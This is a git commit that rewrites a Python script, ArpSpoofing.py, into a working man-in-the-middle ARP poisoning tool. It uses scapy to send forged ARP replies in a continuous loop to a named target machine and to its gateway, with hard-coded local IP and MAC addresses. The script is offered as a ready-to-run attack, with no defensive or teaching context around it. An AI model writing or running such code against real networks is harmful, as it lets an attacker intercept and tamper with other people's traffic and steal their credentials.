e49ff0ff5e8ef8f2ff37b0fcd880584d58834133
Artyom Kiselhof <artyomkiselhof2007@gmail.com>
2026-06-19 17:27:20 +0300

    lagami arp

--- Python/ArpSpoofing.py
+++ Python/ArpSpoofing.py
@@ -1,6 +1,22 @@
 from scapy.all import Ether, ARP, sendp
+import time
 
-spoofed_ip = "192.168.0.1" 
-packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=2, psrc=spoofed_ip)
-while 1:
-    sendp(packet)
+target_ip = "192.168.28.115"
+target_mac = "10:ff:e0:3e:06:03"
+
+gateway_ip = "192.168.28.1"   
+gateway_mac = "88:c3:97:83:9a:4f" 
+
+packet_to_target = Ether(dst=target_mac) / ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst=target_mac)
+
+packet_to_gateway = Ether(dst=gateway_mac) / ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst=gateway_mac)
+
+print("[+] Starting MitM spoofing... Press Ctrl+C to stop.")
+
+try:
+    while True:
+        sendp(packet_to_target, verbose=False)
+        sendp(packet_to_gateway, verbose=False)
+        time.sleep(2)
+except KeyboardInterrupt:
+    print("\n[-] Stopping spoofing.")
